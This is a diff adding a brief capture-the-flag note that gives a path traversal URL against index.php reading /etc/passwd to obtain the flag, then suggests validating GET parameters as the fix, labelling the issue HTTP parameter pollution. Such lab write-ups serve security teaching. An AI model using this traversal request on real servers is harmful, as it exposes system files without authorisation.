@@ -1,0 +1,8 @@
+How to get the flag :
+
+Go to IP/index.php?page=?page=../../../../../../../etc/passwd
+
+
+How to solve HTTP parameter pollution :
+
+Just validate the GET parameters before doing anything with them.
